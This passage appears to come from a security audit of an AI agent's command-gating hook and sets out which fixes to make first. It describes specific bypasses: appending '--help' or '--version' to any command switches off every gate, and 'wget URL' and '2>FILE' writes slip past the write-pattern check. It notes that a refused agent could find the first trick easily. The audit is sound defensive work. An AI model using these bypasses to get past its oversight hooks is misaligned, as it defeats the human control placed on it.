explicitly. Nearly every finding above is a case where that same argument was
applied to one function and not to its neighbour.

**The single most important thing to do first: fix F1 — the `--help` /
`--version` exemption at `check-active-task.sh:179`.** It is one condition, it
runs before every other check in the file, it matches a substring anywhere
including inside quotes, and it exits 0 rather than merely marking the command
safe. Appending seven characters to any command turns off the task gate, the
stale-focus gate, the focus-drift gate, G-013, the status gate, the onboarding
gate, the G-020 readiness gate and the write-pattern check simultaneously —
demonstrated with a matched pair against the live hook. It is the identical class
T-3221 just closed two branches below it, it is trivially discoverable by an agent
that has just been refused a legitimate read (Q2), and it is a five-line fix using
predicates that already exist in this codebase (`_fw_chain_split` +
`_fw_strip_quoted`).

**Next, as one batch:** F4/F5/F6/F7 are four independent holes in the same
predicate pair (`has_bash_write_pattern` + `is_bash_safe_command`) and share a
single root — a verb or flag admitted on the strength of what it *usually* does,
without the verb-scoping test the file already applies to `git config`, `sed -i`,
`yq -i` and `ip link set`. `wget URL` (F4) and `2>FILE` (F5) are the two that
require no unusual command shape at all.

**Then F3**, which is the arc's own dominant failure class inside the arc's own
gauge: the instrument writes down "ok" because it never looked, and caches that
answer for 90 seconds. It is also the cheapest to fix — a sentinel value and one
stderr line.
